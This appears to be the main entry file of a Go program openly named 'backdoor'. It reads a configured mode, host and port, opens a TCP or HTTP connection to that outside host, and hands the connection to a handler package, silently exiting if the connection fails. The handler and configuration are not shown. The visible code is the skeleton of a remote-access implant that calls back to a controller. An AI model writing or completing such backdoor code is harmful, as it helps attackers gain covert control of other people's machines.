package main

import (
	"backdoor/config"
	"backdoor/handler"
	"backdoor/transport"
)

func main() {
	var conn transport.Transport

	switch config.Mode {
	case "tcp":
		conn = transport.NewTCP(config.Host + ":" + config.Port)
	case "udp":
		//conn = transport.NewUDP(config.Host + ":" +config.Port)
	case "http":
		conn = transport.NewHTTP("http://" + config.Host + ":" + config.Port)
	}

	if err := conn.Connect(); err != nil {
		return
	}

	handler.Handle(conn)
}
